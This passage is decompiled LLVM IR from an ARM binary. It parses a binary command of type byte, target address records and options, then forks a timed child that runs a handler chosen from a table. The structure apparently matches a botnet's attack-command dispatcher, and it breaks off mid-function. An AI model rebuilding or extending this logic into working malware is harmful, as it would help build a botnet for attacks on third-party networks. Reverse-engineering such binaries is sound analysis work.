  %v1_8ef8 = add i32 %v0_8f00.in, 12
  %v2_8ef8 = inttoptr i32 %v1_8ef8 to i8*
  %v3_8ef8 = load i8, i8* %v2_8ef8, align 1
  %v4_8ef8 = zext i8 %v3_8ef8 to i32
  %v9_8efc = icmp eq i32 %v4_8ef8, %v1_8ed4
  br i1 %v9_8efc, label %dec_label_pc_8f20, label %dec_label_pc_8f08

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8f08.preheader, %dec_label_pc_8ef8
  %v0_8f00.in = phi i32 [ %v0_8ee0, %dec_label_pc_8f08.preheader ], [ %v0_8f00, %dec_label_pc_8ef8 ]
  %v0_8f08 = phi i32 [ 0, %dec_label_pc_8f08.preheader ], [ %v1_8f08, %dec_label_pc_8ef8 ]
  %v0_8f00 = add i32 %v0_8f00.in, 8
  %v1_8f08 = add i32 %v0_8f08, 1
  %v9_8f0c = icmp eq i32 %v1_8f08, %v1_8ec8
  store i32 %v0_8f00, i32* %r1.global-to-local, align 4
  br i1 %v9_8f0c, label %dec_label_pc_8f18, label %dec_label_pc_8ef8

dec_label_pc_8f18:                                ; preds = %dec_label_pc_8f08, %dec_label_pc_8ec8
  ret i32 %arg4

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8ef8, %dec_label_pc_8ee0
  %v0_8f20 = phi i32 [ %v0_8ee0, %dec_label_pc_8ee0 ], [ %v0_8f00, %dec_label_pc_8ef8 ]
  %v1_8f20 = inttoptr i32 %v0_8f20 to i32*
  %v2_8f20 = load i32, i32* %v1_8f20, align 4
  ret i32 %v2_8f20

; uselistorder directives
  uselistorder i32 %v1_8f08, { 1, 0 }
  uselistorder i32 %v0_8f00, { 1, 0, 2 }
  uselistorder i32 %v0_8f00.in, { 1, 0 }
  uselistorder i32 %v0_8ee0, { 1, 0, 2 }
  uselistorder i32 %v1_8ed4, { 1, 0 }
  uselistorder i32 %v1_8ec8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8f08, { 1, 0 }
}

define i32 @function_8f2c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8f2c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_8f2c = load i32, i32* @r4, align 4
  store i32 %v3_8f2c, i32* %stack_var_-32, align 4
  %v6_8f2c = load i32, i32* @r5, align 4
  %v9_8f2c = load i32, i32* @r6, align 4
  %v12_8f2c = load i32, i32* @r7, align 4
  %v18_8f2c = load i32, i32* @sb, align 4
  %v0_8f30 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8f30, i32* @sb, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v1_8f38 = urem i32 %arg2, 256
  store i32 %v1_8f38, i32* %r7.global-to-local, align 4
  %v0_8f44 = call i32 @fork()
  %v2_8f48 = icmp eq i32 %v0_8f44, -1
  %. = zext i1 %v2_8f48 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8f44, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_8f2c
  store i32 1, i32* %r5.global-to-local, align 4
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_8f2c
  store i32 %., i32* %r5.global-to-local, align 4
  %v2_8f60 = icmp eq i1 %v2_8f48, false
  br i1 %v2_8f60, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  %v3_8f64 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_8f64, i32* %r4.global-to-local, align 4
  store i32 %v6_8f2c, i32* %r5.global-to-local, align 4
  store i32 %v9_8f2c, i32* %r6.global-to-local, align 4
  store i32 %v12_8f2c, i32* %r7.global-to-local, align 4
  store i32 %v18_8f2c, i32* @sb, align 4
  ret i32 %v0_8f44

bb26:                                             ; preds = %bb24
  %v0_8f68 = call i32 @fork()
  %v2_8f6c = icmp eq i32 %v0_8f68, -1
  store i32 %v0_8f68, i32* %r4.global-to-local, align 4
  br i1 %v2_8f6c, label %dec_label_pc_8f9c, label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %bb26
  %v2_8f78 = icmp eq i32 %v0_8f68, 0
  br i1 %v2_8f78, label %dec_label_pc_8f80, label %dec_label_pc_8fa4

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f78
  %v0_8f80 = load i32, i32* %r6.global-to-local, align 4
  %v1_8f84 = call i32 @sleep(i32 %v0_8f80)
  %v0_8f88 = call i32 @getppid()
  %v2_8f90 = call i32 @kill(i32 %v0_8f88, i32 9)
  %v0_8f94 = load i32, i32* %r4.global-to-local, align 4
  call void @exit(i32 %v0_8f94)
  unreachable

dec_label_pc_8f9c:                                ; preds = %bb26
  %v0_8f9c = load i32, i32* %r5.global-to-local, align 4
  call void @exit(i32 %v0_8f9c)
  unreachable

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8f78
  store i32 ptrtoint (i8** @global_var_1a3c4.75 to i32), i32* %r3.global-to-local, align 4
  %v2_8fa8 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_8fa8 = zext i8 %v2_8fa8 to i32
  %v2_8fac = icmp eq i8 %v2_8fa8, 0
  br i1 %v2_8fac, label %dec_label_pc_8ff0, label %dec_label_pc_8fb4

dec_label_pc_8fb4:                                ; preds = %dec_label_pc_8fa4
  store i32 ptrtoint (i32* @global_var_1a3c8.77 to i32), i32* %r3.global-to-local, align 4
  %v2_8fb8 = load i32, i32* @global_var_1a3c8.77, align 4
  %v1_8fbc = inttoptr i32 %v2_8fb8 to i32*
  %v2_8fbc = load i32, i32* %v1_8fbc, align 4
  %v1_8fc0 = add i32 %v2_8fbc, 4
  %v2_8fc0 = inttoptr i32 %v1_8fc0 to i8*
  %v3_8fc0 = load i8, i8* %v2_8fc0, align 1
  %v4_8fc0 = zext i8 %v3_8fc0 to i32
  store i32 %v4_8fc0, i32* %r3.global-to-local, align 4
  %v1_8fc4 = load i32, i32* %r7.global-to-local, align 4
  %v9_8fc4 = icmp eq i32 %v4_8fc0, %v1_8fc4
  br i1 %v9_8fc4, label %dec_label_pc_8ff8, label %dec_label_pc_8fe4.preheader

dec_label_pc_8fe4.preheader:                      ; preds = %dec_label_pc_8fb4
  %v1_8fc8 = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_8fe4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fe4
  %v4_8fd4 = mul i32 %v1_8fe4, 4
  %v5_8fd4 = add i32 %v4_8fd4, %v2_8fb8
  %v6_8fd4 = inttoptr i32 %v5_8fd4 to i32*
  %v7_8fd4 = load i32, i32* %v6_8fd4, align 4
  %v1_8fd8 = add i32 %v7_8fd4, 4
  %v2_8fd8 = inttoptr i32 %v1_8fd8 to i8*
  %v3_8fd8 = load i8, i8* %v2_8fd8, align 1
  %v4_8fd8 = zext i8 %v3_8fd8 to i32
  store i32 %v4_8fd8, i32* %r3.global-to-local, align 4
  %v9_8fdc = icmp eq i32 %v4_8fd8, %v1_8fc4
  br i1 %v9_8fdc, label %dec_label_pc_8ff8, label %dec_label_pc_8fe4

dec_label_pc_8fe4:                                ; preds = %dec_label_pc_8fe4.preheader, %dec_label_pc_8fd4
  %v0_8fe4 = phi i32 [ %v1_8fc8, %dec_label_pc_8fe4.preheader ], [ %v1_8fe4, %dec_label_pc_8fd4 ]
  %v1_8fe4 = add i32 %v0_8fe4, 1
  %v9_8fe8 = icmp eq i32 %v1_8fe4, %v3_8fa8
  br i1 %v9_8fe8, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fe4, %dec_label_pc_8fa4, %dec_label_pc_8ff8
  call void @exit(i32 0)
  unreachable

dec_label_pc_8ff8:                                ; preds = %dec_label_pc_8fd4, %dec_label_pc_8fb4
  %v0_900c = phi i32 [ %v2_8fbc, %dec_label_pc_8fb4 ], [ %v7_8fd4, %dec_label_pc_8fd4 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_900c = inttoptr i32 %v0_900c to i32*
  %v2_900c = load i32, i32* %v1_900c, align 4
  call void @__pseudo_branch(i32 %v2_900c)
  br label %dec_label_pc_8ff0

; uselistorder directives
  uselistorder i32 %v1_8fe4, { 2, 0, 1 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v2_8f48, { 1, 0 }
  uselistorder i32 %v0_8f44, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8ff0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8fe4, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_901c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_901c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v9_901c = load i32, i32* @r6, align 4
  %v12_901c = load i32, i32* @r7, align 4
  %v18_901c = load i32, i32* @sb, align 4
  %v21_901c = load i32, i32* @sl, align 4
  %v27_901c = load i32, i32* @lr, align 4
  %v7_9020 = icmp eq i32 %arg2, 3
  store i1 %v7_9020, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_902c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_902c, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_9040, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %dec_label_pc_901c
  %v7_9034 = icmp eq i32 %arg2, 4
  store i1 %v7_9034, i1* %cpsr_z.global-to-local, align 1
  %v1_9038 = inttoptr i32 %v0_902c to i32*
  %v2_9038 = load i32, i32* %v1_9038, align 4
  store i32 %v2_9038, i32* @sl, align 4
  br i1 %v7_9034, label %dec_label_pc_9040, label %dec_label_pc_9048

dec_label_pc_9040:                                ; preds = %dec_label_pc_9064, %.dec_label_pc_9040_crit_edge, %dec_label_pc_9034, %dec_label_pc_9058, %dec_label_pc_9048, %dec_label_pc_901c
  %v29_9044 = phi i32 [ %v29_9044.pre, %.dec_label_pc_9040_crit_edge ], [ %v0_902c, %dec_label_pc_9064 ], [ %v0_902c, %dec_label_pc_9034 ], [ %v0_902c, %dec_label_pc_9058 ], [ %v0_902c, %dec_label_pc_9048 ], [ %v0_902c, %dec_label_pc_901c ]
  store i32 %v9_901c, i32* @r6, align 4
  store i32 %v12_901c, i32* @r7, align 4
  store i32 %v18_901c, i32* @sb, align 4
  store i32 %v21_901c, i32* @sl, align 4
  ret i32 %v29_9044

dec_label_pc_9048:                                ; preds = %dec_label_pc_9034
  %v7_9048 = icmp eq i32 %arg2, 5
  store i1 %v7_9048, i1* %cpsr_z.global-to-local, align 1
  %v1_904c = add i32 %v0_902c, 4
  %v2_904c = inttoptr i32 %v1_904c to i8*
  %v3_904c = load i8, i8* %v2_904c, align 1
  %v4_904c = zext i8 %v3_904c to i32
  store i32 %v4_904c, i32* %r1.global-to-local, align 4
  br i1 %v7_9048, label %dec_label_pc_9040, label %dec_label_pc_9058

dec_label_pc_9058:                                ; preds = %dec_label_pc_9048
  %v1_9058 = add i32 %v0_902c, 5
  %v2_9058 = inttoptr i32 %v1_9058 to i8*
  %v3_9058 = load i8, i8* %v2_9058, align 1
  %v4_9058 = zext i8 %v3_9058 to i32
  store i32 %v4_9058, i32* @r7, align 4
  %v2_905c = icmp eq i8 %v3_9058, 0
  store i1 %v2_905c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_905c, label %dec_label_pc_9040, label %dec_label_pc_9064

dec_label_pc_9064:                                ; preds = %dec_label_pc_9058
  %v3_9064 = mul nuw nsw i32 %v4_9058, 4
  store i32 %v3_9064, i32* @sb, align 4
  %v1_9068 = add i32 %arg2, -6
  store i32 %v1_9068, i32* @r6, align 4
  %v2_906c = mul nuw nsw i32 %v4_9058, 5
  store i32 %v2_906c, i32* @r8, align 4
  %v3_9070 = icmp ult i32 %v1_9068, %v2_906c
  %v9_9070 = icmp eq i32 %v1_9068, %v2_906c
  store i1 %v9_9070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9070, label %dec_label_pc_9040, label %dec_label_pc_9078

dec_label_pc_9078:                                ; preds = %dec_label_pc_9064
  store i32 %v4_9058, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_9080 = call i32* @calloc(i32 %v4_9058, i32 24)
  %v4_9080 = ptrtoint i32* %v2_9080 to i32
  store i32 %v4_9080, i32* %r0.global-to-local, align 4
  %v0_9084 = load i32, i32* @r7, align 4
  %v2_9084 = icmp eq i32 %v0_9084, 0
  store i1 %v2_9084, i1* %cpsr_z.global-to-local, align 1
  %v0_908c = load i32, i32* @r4, align 4
  %v1_908c = add i32 %v0_908c, 6
  store i32 %v1_908c, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_9084, 1
  br i1 %tmp27, label %dec_label_pc_90e4thread-pre-split, label %dec_label_pc_9094

dec_label_pc_9094:                                ; preds = %dec_label_pc_9078
  store i32 %v4_9080, i32* %r1.global-to-local, align 4
  %v1_9098 = load i32, i32* @r8, align 4
  %v2_9098 = add i32 %v1_9098, %v0_908c
  store i32 %v2_9098, i32* %ip.global-to-local, align 4
  store i32 %v0_908c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_90a8.dec_label_pc_90a8_crit_edge, %dec_label_pc_9094
  %v2_90b8 = phi i32 [ %v1_90cc, %dec_label_pc_90a8.dec_label_pc_90a8_crit_edge ], [ %v4_9080, %dec_label_pc_9094 ]
  %v1_90b4 = phi i32 [ %v1_90b4.pre, %dec_label_pc_90a8.dec_label_pc_90a8_crit_edge ], [ %v2_9098, %dec_label_pc_9094 ]
  %v0_90b0 = phi i32 [ %v0_90a8.pre, %dec_label_pc_90a8.dec_label_pc_90a8_crit_edge ], [ %v0_908c, %dec_label_pc_9094 ]
  %v1_90a8 = add i32 %v0_90b0, 10
  %v2_90a8 = inttoptr i32 %v1_90a8 to i8*
  %v3_90a8 = load i8, i8* %v2_90a8, align 1
  %v1_90ac = add i32 %v0_90b0, 6
  %v2_90ac = inttoptr i32 %v1_90ac to i32*
  %v3_90ac = load i32, i32* %v2_90ac, align 4
  store i32 %v3_90ac, i32* %r2.global-to-local, align 4
  %v1_90b0 = add i32 %v0_90b0, 5
  store i32 %v1_90b0, i32* %r0.global-to-local, align 4
  %v9_90b4 = icmp eq i32 %v1_90b0, %v1_90b4
  store i1 %v9_90b4, i1* %cpsr_z.global-to-local, align 1
  %v3_90b8 = add i32 %v2_90b8, 20
  %v4_90b8 = inttoptr i32 %v3_90b8 to i8*
  store i8 %v3_90a8, i8* %v4_90b8, align 1
  %v0_90bc = load i32, i32* %r2.global-to-local, align 4
  %v1_90bc = load i32, i32* %r1.global-to-local, align 4
  %v2_90bc = add i32 %v1_90bc, 4
  %v3_90bc = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_90bc, i32* %v3_90bc, align 4
  %v0_90c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_90c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_90c0 = add i32 %v1_90c0, 16
  %v3_90c0 = inttoptr i32 %v2_90c0 to i32*
  store i32 %v0_90c0, i32* %v3_90c0, align 4
  %v0_90c4 = load i32, i32* @r4, align 4
  %v1_90c4 = trunc i32 %v0_90c4 to i8
  %v2_90c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_90c4 = inttoptr i32 %v2_90c4 to i8*
  store i8 %v1_90c4, i8* %v3_90c4, align 1
  %v0_90c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_90c8 = trunc i32 %v0_90c8 to i8
  %v2_90c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_90c8 = add i32 %v2_90c8, 1
  %v4_90c8 = inttoptr i32 %v3_90c8 to i8*
  store i8 %v1_90c8, i8* %v4_90c8, align 1
  %v0_90cc = load i32, i32* %r1.global-to-local, align 4
  %v1_90cc = add i32 %v0_90cc, 24
  store i32 %v1_90cc, i32* %r1.global-to-local, align 4
  %v0_90d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_90d0, label %dec_label_pc_90d4, label %dec_label_pc_90a8.dec_label_pc_90a8_crit_edge

dec_label_pc_90a8.dec_label_pc_90a8_crit_edge:    ; preds = %dec_label_pc_90a8
  %v0_90a8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_90b4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_90a8

dec_label_pc_90d4:                                ; preds = %dec_label_pc_90a8
  %v0_90d4 = load i32, i32* @sb, align 4
  %v1_90d4 = load i32, i32* @r7, align 4
  %v1_90d8 = load i32, i32* @r5, align 4
  %sum = add i32 %v1_90d4, %v0_90d4
  %v2_90d8 = sub i32 %v1_90d8, %sum
  %v0_90dc = load i32, i32* %r0.global-to-local, align 4
  %v1_90dc = add i32 %v0_90dc, 6
  store i32 %v1_90dc, i32* %fp.global-to-local, align 4
  %v1_90e0 = add i32 %v2_90d8, -6
  store i32 %v1_90e0, i32* @r6, align 4
  br label %dec_label_pc_90e4

dec_label_pc_90e4thread-pre-split:                ; preds = %dec_label_pc_9078
  %v0_90e4.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_90e4

dec_label_pc_90e4:                                ; preds = %dec_label_pc_90e4thread-pre-split, %dec_label_pc_90d4
  %v0_90f0 = phi i32 [ %v1_908c, %dec_label_pc_90e4thread-pre-split ], [ %v1_90dc, %dec_label_pc_90d4 ]
  %v1_90e8 = phi i32 [ %v0_90e4.pr, %dec_label_pc_90e4thread-pre-split ], [ %v1_90e0, %dec_label_pc_90d4 ]
  %v2_90e4 = icmp eq i32 %v1_90e8, 0
  store i1 %v2_90e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_90e4, label %dec_label_pc_921c, label %dec_label_pc_90f0

dec_label_pc_90f0:                                ; preds = %dec_label_pc_90e4
  %v1_90f0 = inttoptr i32 %v0_90f0 to i8*
  %v2_90f0 = load i8, i8* %v1_90f0, align 1
  %v3_90f0 = zext i8 %v2_90f0 to i32
  store i32 %v3_90f0, i32* @sb, align 4
  %v2_90f4 = icmp eq i8 %v2_90f0, 0
  store i1 %v2_90f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_90f4, label %dec_label_pc_91d4, label %dec_label_pc_9104

dec_label_pc_9104:                                ; preds = %dec_label_pc_90f0
  store i32 %v3_90f0, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_910c = call i32* @calloc(i32 %v3_90f0, i32 8)
  %v4_910c = ptrtoint i32* %v2_910c to i32
  store i32 %v4_910c, i32* %r0.global-to-local, align 4
  %v0_9110 = load i32, i32* @sb, align 4
  %v2_9110 = icmp eq i32 %v0_9110, 0
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_9110, 1
  br i1 %tmp28, label %dec_label_pc_91d4, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %dec_label_pc_9104
  %v0_9120 = load i32, i32* @r6, align 4
  %v1_9120 = add i32 %v0_9120, -1
  store i32 %v1_9120, i32* %r2.global-to-local, align 4
  %v7_9120 = icmp eq i32 %v0_9120, 1
  store i1 %v7_9120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9120, label %dec_label_pc_921c, label %dec_label_pc_9128

dec_label_pc_9128:                                ; preds = %dec_label_pc_9120
  %v0_9128 = load i32, i32* %fp.global-to-local, align 4
  %v1_9128 = add i32 %v0_9128, 1
  %v2_9128 = inttoptr i32 %v1_9128 to i8*
  %v3_9128 = load i8, i8* %v2_9128, align 1
  %v1_912c = add i32 %v0_9120, -2
  store i32 %v1_912c, i32* %r2.global-to-local, align 4
  %v7_912c = icmp eq i32 %v1_9120, 1
  store i1 %v7_912c, i1* %cpsr_z.global-to-local, align 1
  %v3_9130 = add i32 %v4_910c, 4
  %v4_9130 = inttoptr i32 %v3_9130 to i8*
  store i8 %v3_9128, i8* %v4_9130, align 1
  %v0_9134 = load i32, i32* %fp.global-to-local, align 4
  %v1_9134 = add i32 %v0_9134, 1
  store i32 %v1_9134, i32* %r0.global-to-local, align 4
  %v0_9138 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9138, label %dec_label_pc_921c, label %dec_label_pc_913c

dec_label_pc_913c:                                ; preds = %dec_label_pc_9128
  %v1_913c = add i32 %v0_9134, 2
  %v2_913c = inttoptr i32 %v1_913c to i8*
  %v3_913c = load i8, i8* %v2_913c, align 1
  %v4_913c = zext i8 %v3_913c to i32
  store i32 %v4_913c, i32* @r4, align 4
  %v0_9140 = load i32, i32* %r2.global-to-local, align 4
  %v1_9140 = add i32 %v0_9140, -1
  store i32 %v1_9140, i32* @r8, align 4
  %v9_9144 = icmp eq i32 %v1_9140, %v4_913c
  store i1 %v9_9144, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_913c, i32* %r0.global-to-local, align 4
  %v5_914c = icmp slt i32 %v1_9140, %v4_913c
  br i1 %v5_914c, label %dec_label_pc_921c, label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_913c
  store i32 %v4_910c, i32* @r5, align 4
  %v1_9158 = add i32 %v4_910c, 8
  %v1_915c = add i32 %v0_9134, 3
  store i32 %v1_915c, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_91a0

dec_label_pc_916c:                                ; preds = %dec_label_pc_91a0
  %v0_916c = load i32, i32* @r8, align 4
  %v1_916c = load i32, i32* @r4, align 4
  %v2_916c = sub i32 %v0_916c, %v1_916c
  store i32 %v2_916c, i32* %r2.global-to-local, align 4
  %v9_916c = icmp eq i32 %v0_916c, %v1_916c
  store i1 %v9_916c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_916c, label %dec_label_pc_921c, label %dec_label_pc_9174

dec_label_pc_9174:                                ; preds = %dec_label_pc_916c
  %v1_9174 = load i32, i32* @r6, align 4
  %v2_9174 = add i32 %v1_9174, %v1_916c
  %v3_9174 = inttoptr i32 %v2_9174 to i8*
  %v4_9174 = load i8, i8* %v3_9174, align 1
  store i32 %v2_9174, i32* %r0.global-to-local, align 4
  %v1_917c = add i32 %v2_916c, -1
  store i32 %v1_917c, i32* %r2.global-to-local, align 4
  %v7_917c = icmp eq i32 %v2_916c, 1
  store i1 %v7_917c, i1* %cpsr_z.global-to-local, align 1
  %v3_9180 = add i32 %v2_9180, 4
  %v4_9180 = inttoptr i32 %v3_9180 to i8*
  store i8 %v4_9174, i8* %v4_9180, align 1
  %v0_9184 = load i32, i32* %r0.global-to-local, align 4
  %v0_9188 = load i32, i32* %r2.global-to-local, align 4
  %v1_9188 = add i32 %v0_9188, -1
  store i32 %v1_9188, i32* @r8, align 4
  %v1_918c = add i32 %v0_9184, 2
  store i32 %v1_918c, i32* @r6, align 4
  %v0_9190 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9190, label %dec_label_pc_921c, label %dec_label_pc_9194

dec_label_pc_9194:                                ; preds = %dec_label_pc_9174
  %v1_9184 = add i32 %v0_9184, 1
  %v2_9194 = inttoptr i32 %v1_9184 to i8*
  %v3_9194 = load i8, i8* %v2_9194, align 1
  %v4_9194 = zext i8 %v3_9194 to i32
  store i32 %v4_9194, i32* @r4, align 4
  %v2_9198 = sub i32 %v1_9188, %v4_9194
  %tmp30 = sub i32 0, %v2_9198
  %v6_9198 = and i32 %v1_9188, %tmp30
  %v7_9198 = icmp slt i32 %v6_9198, 0
  %v8_9198 = icmp slt i32 %v2_9198, 0
  %v9_9198 = icmp eq i32 %v1_9188, %v4_9194
  store i1 %v9_9198, i1* %cpsr_z.global-to-local, align 1
  %v2_919c = xor i1 %v8_9198, %v7_9198
  br i1 %v2_919c, label %dec_label_pc_921c, label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_9194, %dec_label_pc_9150
  %v0_91a4 = phi i32 [ %v4_913c, %dec_label_pc_9150 ], [ %v4_9194, %dec_label_pc_9194 ]
  %v2_9180 = phi i32 [ %v1_9158, %dec_label_pc_9150 ], [ %v1_91c4, %dec_label_pc_9194 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_91a4 = add nuw nsw i32 %v0_91a4, 1
  store i32 %v1_91a4, i32* %r0.global-to-local, align 4
  %v2_91a8 = call i32* @calloc(i32 %v1_91a4, i32 1)
  %v3_91a8 = ptrtoint i32* %v2_91a8 to i32
  store i32 %v3_91a8, i32* %r0.global-to-local, align 4
  %v0_91ac = load i32, i32* @r6, align 4
  store i32 %v0_91ac, i32* %r1.global-to-local, align 4
  %v1_91b0 = load i32, i32* @r5, align 4
  %v2_91b0 = inttoptr i32 %v1_91b0 to i32*
  store i32 %v3_91a8, i32* %v2_91b0, align 4
  %v0_91b4 = load i32, i32* @r4, align 4
  store i32 %v0_91b4, i32* %r2.global-to-local, align 4
  %v3_91b8 = call i32 @function_11814(i32 %v3_91a8, i32 %v0_91ac, i32 %v0_91b4)
  store i32 %v3_91b8, i32* %r0.global-to-local, align 4
  store i32 %v2_9180, i32* @r5, align 4
  %v0_91c0 = load i32, i32* %fp.global-to-local, align 4
  %v1_91c0 = add i32 %v0_91c0, 1
  store i32 %v1_91c0, i32* %fp.global-to-local, align 4
  %v1_91c4 = add i32 %v2_9180, 8
  store i32 %v1_91c4, i32* %ip.global-to-local, align 4
  %v1_91c8 = load i32, i32* @sb, align 4
  %v9_91c8 = icmp eq i32 %v1_91c0, %v1_91c8
  store i1 %v9_91c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_91c8, label %dec_label_pc_91d4, label %dec_label_pc_916c

dec_label_pc_91d4:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_9104, %dec_label_pc_90f0
  %stack_var_-48.1 = phi i32 [ %v3_90f0, %dec_label_pc_90f0 ], [ %v0_9110, %dec_label_pc_9104 ], [ %v0_9110, %dec_label_pc_91a0 ]
  %stack_var_-52.2 = phi i32 [ %v3_90f0, %dec_label_pc_90f0 ], [ %v4_910c, %dec_label_pc_9104 ], [ %v4_910c, %dec_label_pc_91a0 ]
  %v0_91d4 = call i32* @__errno_location()
  %v0_91d8 = load i32, i32* @sl, align 4
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_91e4 = mul i32 %v0_91d8, 16777216
  %v1_91d8 = mul i32 %v0_91d8, 256
  %v4_91e8 = and i32 %v1_91d8, 16711680
  %v5_91e8 = or i32 %v4_91e8, %v3_91e4
  store i32 %v5_91e8, i32* %r1.global-to-local, align 4
  %v1_91e0 = udiv i32 %v0_91d8, 256
  %v3_91ec = and i32 %v1_91e0, 65280
  store i32 %v3_91ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v0_91d4, align 4
  %v1_91f8 = load i32, i32* @sl, align 4
  %v4_91f8 = udiv i32 %v1_91f8, 16777216
  %v5_91f8 = or i32 %v4_91f8, %v3_91ec
  %v0_91fc = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* %ip.global-to-local, align 4
  %v1_9204 = load i32, i32* %r1.global-to-local, align 4
  %v2_9204 = or i32 %v5_91f8, %v1_9204
  store i32 %v2_9204, i32* %r0.global-to-local, align 4
  store i32 %v4_904c, i32* %r1.global-to-local, align 4
  %v0_9210 = load i32, i32* @r7, align 4
  store i32 %v0_9210, i32* %r2.global-to-local, align 4
  %v6_9218 = trunc i32 %v0_91fc to i8
  %v7_9218 = call i32 @function_8f2c(i32 %v2_9204, i32 %v4_904c, i32 %v0_9210, i32 %v4_9080, i8 %v6_9218, i32 %stack_var_-52.2)
  store i32 %v7_9218, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %dec_label_pc_9194, %dec_label_pc_9174, %dec_label_pc_916c, %dec_label_pc_913c, %dec_label_pc_9128, %dec_label_pc_9120, %dec_label_pc_90e4, %dec_label_pc_91d4
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_90e4 ], [ %stack_var_-52.2, %dec_label_pc_91d4 ], [ %v4_910c, %dec_label_pc_9120 ], [ %v4_910c, %dec_label_pc_9128 ], [ %v4_910c, %dec_label_pc_913c ], [ %v4_910c, %dec_label_pc_916c ], [ %v4_910c, %dec_label_pc_9174 ], [ %v4_910c, %dec_label_pc_9194 ]
  store i32 %v4_9080, i32* %r1.global-to-local, align 4
  %v2_9220 = icmp eq i32* %v2_9080, null
  store i1 %v2_9220, i1* %cpsr_z.global-to-local, align 1
